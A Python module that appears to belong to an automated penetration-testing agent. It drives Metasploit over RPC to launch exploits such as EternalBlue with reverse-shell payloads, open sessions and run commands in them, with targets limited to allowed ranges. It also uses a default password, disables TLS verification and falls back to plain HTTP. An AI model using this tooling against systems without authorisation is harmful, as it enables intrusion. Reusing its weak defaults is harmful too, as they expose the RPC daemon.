"""Metasploit RPC client wrapper for the Exploit Agent.

Provides a high-level, privacy-aware interface to the Metasploit
Framework via its MSGRPC daemon, using pymetasploit3 under the hood.
All exploit execution is gated by ALLOWED_TARGET_RANGES validation.
"""

from __future__ import annotations

import logging
import os
import socket
import subprocess
import time
from dataclasses import dataclass, field
from ipaddress import ip_address, ip_network
from typing import Any

import msgpack
import requests as _requests

logger = logging.getLogger(__name__)

from src.config.settings import ALLOWED_TARGET_RANGES


def validate_target(ip: str) -> bool:
    """Reject any target not in allowed ranges. No exceptions.

    Args:
        ip: IPv4 address string to validate.

    Returns:
        True if *ip* falls within an authorised range.
    """
    try:
        addr = ip_address(ip)
    except ValueError:
        logger.error(f"Invalid IP address format: {ip}")
        return False
    return any(addr in ip_network(net, strict=False) for net in ALLOWED_TARGET_RANGES)


# ---------------------------------------------------------------------------
# Custom exceptions
# ---------------------------------------------------------------------------
class MetasploitRPCError(Exception):
    """Base exception for Metasploit RPC operations."""


class MetasploitConnectionError(MetasploitRPCError):
    """Raised when the RPC daemon cannot be reached."""


class MetasploitModuleError(MetasploitRPCError):
    """Raised when a module cannot be found or execution fails."""


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------
@dataclass
class MsfModule:
    """Describes a single Metasploit module."""

    name: str
    full_path: str
    description: str
    rank: str
    references: list[str]


@dataclass
class ExploitOptions:
    """Configuration for an exploit execution attempt."""

    rhosts: str
    rport: int
    payload: str
    lhost: str = "0.0.0.0"
    lport: int = 4444
    extra_options: dict[str, str] = field(default_factory=dict)


@dataclass
class ExploitExecutionResult:
    """Outcome of an exploit execution attempt."""

    success: bool
    session_id: int | None
    module_used: str
    target: str
    error_message: str = ""
    raw_output: str = ""


@dataclass
class SessionInfo:
    """Metadata for an active Metasploit session."""

    session_id: int
    session_type: str
    target_host: str
    username: str
    platform: str
    via_exploit: str


# ---------------------------------------------------------------------------
# RPC Client
# ---------------------------------------------------------------------------
class MetasploitRPCClient:
    """High-level, safety-gated wrapper around pymetasploit3's MsfRpcClient.

    Usage::

        with MetasploitRPCClient(password="secret") as msf:
            modules = msf.search_modules("eternalblue")
            result  = msf.execute_exploit(
                "exploit/windows/smb/ms17_010_eternalblue",
                ExploitOptions(
                    rhosts="10.10.10.40",
                    rport=445,
                    payload="windows/x64/meterpreter/reverse_tcp",
                ),
            )
    """

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        password: str = "",
        ssl: bool = True,
    ) -> None:
        """Store connection parameters without connecting.

        Args:
            host: Address of the msfrpcd daemon (default: 127.0.0.1).
            port: TCP port of the msfrpcd daemon (default: 55553).
            password: Authentication password (default: read from config/env).
            ssl: Whether to use SSL/TLS (default: True).
        """
        self._host = host
        self._port = port
        self._password = password
        self._ssl = ssl
        self._client: Any | None = None
        logger.debug(
            f"MetasploitRPCClient configured for {self._host}:{self._port} (ssl={self._ssl})"
        )

    # -- context manager ----------------------------------------------------

    def __enter__(self) -> MetasploitRPCClient:
        """Connect on entering context manager."""
        self.connect()
        return self

    def __exit__(
        self,
        exc_type: type[BaseException] | None,
        exc_val: BaseException | None,
        exc_tb: Any | None,
    ) -> None:
        """Disconnect on exiting context manager."""
        self.disconnect()

    # -- connection lifecycle -----------------------------------------------

    def connect(self) -> bool:
        """Establish a connection to the Metasploit RPC daemon.

        Uses direct msgpack-over-HTTP calls to avoid pymetasploit3
        bytes-key Python-3.13 incompatibility.

        Returns:
            True when the connection succeeds.

        Raises:
            MetasploitConnectionError: If the daemon is unreachable or auth fails.
        """
        # Read password from settings if not set
        if not self._password:
            from src.config.settings import MSF_RPC_PASSWORD

            self._password = MSF_RPC_PASSWORD or "msfpassword"

        # ── Fast port reachability check ─────────────────────────────
        try:
            with socket.create_connection((self._host, self._port), timeout=3.0):
                pass
        except (OSError, socket.timeout) as tcp_err:
            raise MetasploitConnectionError(
                f"msfrpcd TCP port {self._host}:{self._port} is not open "
                f"({tcp_err}). Is msfrpcd running?"
            ) from tcp_err

        # ── Auth via raw msgpack HTTP (try configured SSL mode, fallback if needed) ──
        for ssl_mode in [self._ssl, not self._ssl]:
            scheme = "https" if ssl_mode else "http"
            self._rpc_url = f"{scheme}://{self._host}:{self._port}/api/"
            try:
                resp = self._rpc_raw("auth.login", "msf", self._password)
                result = resp.get(b"result", resp.get("result", ""))
                if isinstance(result, bytes):
                    result = result.decode()
                if result == "success":
                    token = resp.get(b"token", resp.get("token", b""))
                    if isinstance(token, bytes):
                        token = token.decode()
                    self._ssl = ssl_mode
                    self._client = {"token": token, "url": self._rpc_url}
                    logger.info(
                        "Connected to msfrpcd at %s:%d (ssl=%s) via raw msgpack",
                        self._host,
                        self._port,
                        self._ssl,
                    )
                    return True
            except Exception:
                continue

        raise MetasploitConnectionError(
            f"Failed to authenticate with msfrpcd at {self._host}:{self._port}"
        )

    def disconnect(self) -> None:
        """Release the RPC connection and clean up resources."""
        if self._client is not None:
            try:
                token = self._client.get("token", "")
                if token:
                    self._rpc_raw("auth.logout", token)
            except Exception as exc:
                logger.debug("Non-critical error during disconnect: %s", exc)
            finally:
                self._client = None
                logger.info("Disconnected from msfrpcd")

    def is_connected(self) -> bool:
        """Check whether the RPC connection is alive."""
        return self._client is not None

    # -- helpers ------------------------------------------------------------

    def _rpc_raw(self, method: str, *args: Any) -> Any:
        """Send a raw msgpack RPC request and return the decoded response.

        Does NOT require a connected state — used for auth.login itself.
        """
        url = getattr(self, "_rpc_url", f"http://{self._host}:{self._port}/api/")
        payload = msgpack.dumps([method] + list(args))
        r = _requests.post(
            url,
            data=payload,
            headers={"Content-Type": "binary/message-pack"},
            timeout=30,
            verify=False,
        )
        return msgpack.loads(r.content, raw=False, strict_map_key=False)

    def _rpc(self, method: str, *args: Any) -> Any:
        """Send an authenticated RPC request.

        Raises:
            MetasploitConnectionError: If not connected.
        """
        if self._client is None:
            raise MetasploitConnectionError("Not connected to msfrpcd")
        token = self._client["token"]
        return self._rpc_raw(method, token, *args)

    # -- health -------------------------------------------------------------

    def health_check(self) -> bool:
        """Verify the RPC daemon is responsive."""
        if not self.is_connected():
            logger.warning("health_check called without connection")
            return False
        try:
            resp = self._rpc("core.version")
            version = resp.get(b"version", resp.get("version", "?"))
            logger.debug("msfrpcd health OK: %s", version)
            return True
        except Exception as exc:
            logger.error("msfrpcd health check failed: %s", exc)
            return False

    # -- module operations --------------------------------------------------

    def validate_module_exists(self, module_path: str) -> bool:
        """Check whether *module_path* exists in Metasploit."""
        self._require_connection()
        try:
            # module.info raises an error dict if the module doesn't exist
            parts = module_path.strip("/").split("/", 1)
            mod_type = parts[0] if parts else "exploit"
            mod_name = parts[1] if len(parts) > 1 else module_path
            resp = self._rpc("module.info", mod_type, mod_name)
            if isinstance(resp, dict):
                err = resp.get(b"error", resp.get("error", False))
                return not err
            return True
        except Exception:
            return False

    def search_modules(
        self,
        query: str,
        module_type: str = "exploit",
    ) -> list[MsfModule]:
        """Search for modules matching *query*.

        Args:
            query: Free-text search string (e.g. ``"openssh"``).
            module_type: Module type filter — ``exploit``, ``auxiliary``,
                ``post``, etc. Pass empty string to return all types.

        Returns:
            A list of matching :class:`MsfModule` objects.

        Raises:
            MetasploitConnectionError: If not connected.
        """
        self._require_connection()
        results: list[MsfModule] = []
        try:
            raw = self._rpc("module.search", query)
            # raw is a list of dicts with bytes keys
            if not isinstance(raw, list):
                raw = []
            for mod in raw:

                def _s(key: str) -> str:
                    v = mod.get(key.encode(), mod.get(key, ""))
                    return v.decode() if isinstance(v, bytes) else str(v)

                mod_type_val = _s("type")
                if module_type and mod_type_val != module_type:
                    continue
                fullname = _s("fullname")
                if not fullname:
                    continue
                results.append(
                    MsfModule(
                        name=_s("name"),
                        full_path=fullname,
                        description=_s("description"),
                        rank=_s("rank"),
                        references=[],
                    )
                )
            logger.info(
                "Module search for %r returned %d %s result(s)",
                query,
                len(results),
                module_type or "any",
            )
        except MetasploitConnectionError:
            raise
        except Exception as exc:
            logger.error("Module search failed: %s", exc)
        return results

    # -- exploit execution --------------------------------------------------

    def execute_exploit(
        self,
        module_path: str,
        options: ExploitOptions,
    ) -> ExploitExecutionResult:
        """Execute an exploit module against the specified target."""
        self._require_connection()

        # --- target-scope gate -------------------------------------------
        if not validate_target(options.rhosts):
            msg = f"Target {options.rhosts} is OUTSIDE allowed ranges — exploit blocked"
            logger.critical("SECURITY: %s", msg)
            raise MetasploitModuleError(msg)

        # --- validate module exists --------------------------------------
        if not self.validate_module_exists(module_path):
            raise MetasploitModuleError(f"Module not found: {module_path}")

        # --- build options dict ------------------------------------------
        opts: dict[str, Any] = {
            "RHOSTS": options.rhosts,
            "RPORT": str(options.rport),
            "PAYLOAD": options.payload,
            "LHOST": options.lhost,
            "LPORT": str(options.lport),
        }
        opts.update(options.extra_options)

        logger.warning(
            "Executing exploit %s against %s:%d",
            module_path,
            options.rhosts,
            options.rport,
        )

        # --- fire --------------------------------------------------------
        parts = module_path.strip("/").split("/", 1)
        mod_type = parts[0] if parts else "exploit"
        mod_name = parts[1] if len(parts) > 1 else module_path

        start = time.monotonic()
        try:
            resp = self._rpc("module.execute", mod_type, mod_name, opts)
            elapsed_ms = (time.monotonic() - start) * 1000
            logger.info("Exploit execution completed in %.0fms", elapsed_ms)
        except MetasploitConnectionError:
            raise
        except Exception as exc:
            elapsed_ms = (time.monotonic() - start) * 1000
            logger.error("Exploit execution failed after %.0fms: %s", elapsed_ms, exc)
            return ExploitExecutionResult(
                success=False,
                session_id=None,
                module_used=module_path,
                target=options.rhosts,
                error_message=str(exc),
            )

        # Check for immediate errors in response
        if isinstance(resp, dict):
            err = resp.get(b"error", resp.get("error", False))
            if err:
                err_msg = resp.get(
                    b"error_message", resp.get("error_message", b"Unknown")
                )
                if isinstance(err_msg, bytes):
                    err_msg = err_msg.decode()
                return ExploitExecutionResult(
                    success=False,
                    session_id=None,
                    module_used=module_path,
                    target=options.rhosts,
                    error_message=str(err_msg),
                )

        # --- poll for session --------------------------------------------
        session_id = self._wait_for_session(options.rhosts, timeout=30)

        if session_id is not None:
            logger.critical(
                "Exploit SUCCESS — session %d on %s via %s",
                session_id,
                options.rhosts,
                module_path,
            )
            return ExploitExecutionResult(
                success=True,
                session_id=session_id,
                module_used=module_path,
                target=options.rhosts,
                raw_output=str(resp),
            )

        logger.warning(
            "Exploit completed but no session on %s",
            options.rhosts,
        )
        return ExploitExecutionResult(
            success=False,
            session_id=None,
            module_used=module_path,
            target=options.rhosts,
            error_message="No session established",
            raw_output=str(resp),
        )

    # -- session operations -------------------------------------------------

    def list_sessions(self) -> list[SessionInfo]:
        """List all active Metasploit sessions."""
        self._require_connection()
        sessions: list[SessionInfo] = []
        try:
            raw = self._rpc("session.list")
            if isinstance(raw, dict):
                for sid, info in raw.items():
                    if isinstance(info, dict):

                        def _si(key: str) -> str:
                            v = info.get(key.encode(), info.get(key, ""))
                            return v.decode() if isinstance(v, bytes) else str(v)

                        sessions.append(
                            SessionInfo(
                                session_id=int(sid),
                                session_type=_si("type"),
                                target_host=_si("target_host"),
                                username=_si("username"),
                                platform=_si("platform"),
                                via_exploit=_si("via_exploit"),
                            )
                        )
            logger.info("Found %d active session(s)", len(sessions))
        except MetasploitConnectionError:
            raise
        except Exception as exc:
            logger.error("Failed to list sessions: %s", exc)
        return sessions

    def run_session_command(
        self,
        session_id: int,
        command: str,
    ) -> str:
        """Execute a command inside an active session."""
        self._require_connection()
        logger.info("Running command in session %d: %r", session_id, command)
        try:
            resp = self._rpc("session.shell_write", str(session_id), command + "\n")
            time.sleep(1)
            read_resp = self._rpc("session.shell_read", str(session_id))
            data = read_resp.get(b"data", read_resp.get("data", b""))
            output = data.decode() if isinstance(data, bytes) else str(data)
            logger.debug("Session %d output: %d chars", session_id, len(output))
            return output
        except MetasploitConnectionError:
            raise
        except Exception as exc:
            raise MetasploitRPCError(
                f"Failed to run command in session {session_id}: {exc}"
            ) from exc

    # -- private helpers ----------------------------------------------------

    def _try_start_msfrpcd(self) -> bool:
        """Attempt to start msfrpcd as a background daemon.

        Uses the configured credentials. Waits up to 30 s for the port
        to become reachable. Returns True if the daemon is ready.
        """
        logger.info("Attempting to auto-start msfrpcd daemon...")
        try:
            cmd = [
                "msfrpcd",
                "-U",
                "msf",
                "-P",
                self._password or "msfpassword",
                "-a",
                self._host,
                "-p",
                str(self._port),
                "-S",  # disable SSL (match MSF_RPC_SSL=false in .env)
                "-f",  # run in foreground (we background via subprocess)
            ]
            # Use sudo only if available and needed; suppress errors silently
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
            logger.info("msfrpcd started (PID %d) — waiting for port...", proc.pid)
        except FileNotFoundError:
            logger.error("msfrpcd binary not found — is Metasploit installed?")
            return False
        except Exception as exc:
            logger.error("Failed to start msfrpcd: %s", exc)
            return False

        # Wait up to 30 s for the port to open
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline:
            try:
                with socket.create_connection((self._host, self._port), timeout=2.0):
                    logger.info("msfrpcd port is open — daemon ready")
                    return True
            except (OSError, socket.timeout):
                time.sleep(2)

        logger.error("msfrpcd did not become ready within 30 s")
        return False

    def _auto_connect(self) -> None:
        """Connect to msfrpcd, starting it first if necessary.

        Called by ``_require_connection()`` so that any method that needs
        a live connection will transparently establish one rather than
        raising an error on first use.
        """
        if self.is_connected():
            return

        # First attempt: connect to an already-running daemon
        try:
            self.connect()
            return
        except MetasploitConnectionError:
            logger.warning(
                "msfrpcd not reachable at %s:%d — attempting auto-start.",
                self._host,
                self._port,
            )

        # Second attempt: start daemon then connect
        if self._try_start_msfrpcd():
            try:
                self.connect()
                return
            except MetasploitConnectionError as exc:
                logger.error("Still cannot connect after auto-start: %s", exc)

        raise MetasploitConnectionError(
            f"Cannot reach msfrpcd at {self._host}:{self._port} even after "
            "auto-start attempt. Run 'sudo msfrpcd -U msf -P <pass> -a 127.0.0.1 -p 55553 -S -f &' manually."
        )

    def _require_connection(self) -> None:
        """Ensure a live connection exists, raising if not connected."""
        if not self.is_connected():
            raise MetasploitConnectionError(
                "Not connected to msfrpcd — call connect() first"
            )

    def _wait_for_session(
        self,
        target: str,
        timeout: int = 30,
    ) -> int | None:
        """Poll for a new session on *target* up to *timeout* seconds."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                raw = self._rpc("session.list")
                if isinstance(raw, dict):
                    for sid, info in raw.items():
                        host = info.get(b"target_host", info.get("target_host", ""))
                        if isinstance(host, bytes):
                            host = host.decode()
                        if host == target:
                            return int(sid)
            except Exception:
                pass
            time.sleep(2)
        return None
